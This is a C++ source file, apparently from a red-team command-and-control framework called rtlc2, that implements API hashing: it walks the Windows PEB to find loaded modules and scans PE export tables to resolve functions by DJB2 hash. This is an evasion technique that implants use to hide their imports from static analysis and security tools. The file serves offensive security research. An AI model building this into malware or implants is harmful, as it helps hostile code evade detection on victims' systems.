// String Obfuscation and API Hashing runtime support
#include "obfuscation.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <winternl.h>

namespace rtlc2 {
namespace obfuscation {

// Walk PEB to find module by hash (no API calls needed)
void* ResolveModuleByHash(uint32_t moduleHash) {
    // Access PEB via TEB
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif

    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        // Hash the module name (lowercase)
        if (mod->FullDllName.Buffer) {
            WCHAR* name = mod->FullDllName.Buffer;
            // Find the filename part
            WCHAR* fileName = name;
            for (WCHAR* p = name; *p; p++) {
                if (*p == '\\' || *p == '/') fileName = p + 1;
            }

            // Hash lowercase name
            uint32_t hash = 5381;
            for (WCHAR* p = fileName; *p; p++) {
                WCHAR c = *p;
                if (c >= 'A' && c <= 'Z') c += 32; // toLower
                hash = ((hash << 5) + hash) + (uint8_t)c;
            }

            if (hash == moduleHash) {
                return mod->DllBase;
            }
        }

        entry = entry->Flink;
    }
    return nullptr;
}

// Walk export table to find function by hash
void* ResolveAPIByHash(void* moduleBase, uint32_t apiHash) {
    if (!moduleBase) return nullptr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRVA) return nullptr;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleBase + exportRVA);
    DWORD* nameRVAs = (DWORD*)((BYTE*)moduleBase + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)moduleBase + exports->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)moduleBase + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* funcName = (const char*)((BYTE*)moduleBase + nameRVAs[i]);

        // Compute DJB2 hash of function name
        uint32_t hash = 5381;
        const char* p = funcName;
        while (*p) {
            hash = ((hash << 5) + hash) + (uint8_t)*p++;
        }

        if (hash == apiHash) {
            DWORD funcRVA = funcRVAs[ordinals[i]];
            return (BYTE*)moduleBase + funcRVA;
        }
    }

    return nullptr;
}

} // namespace obfuscation
} // namespace rtlc2

#endif // RTLC2_WINDOWS
